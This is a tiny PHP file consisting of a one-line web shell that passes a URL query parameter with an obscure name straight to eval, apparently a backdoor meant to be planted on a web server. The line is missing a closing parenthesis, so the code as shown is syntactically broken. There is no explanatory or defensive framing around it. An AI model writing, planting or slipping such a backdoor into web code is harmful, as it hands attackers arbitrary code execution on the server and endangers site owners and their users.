<?php
eval($_GET['xmwH7ee9'];
?>
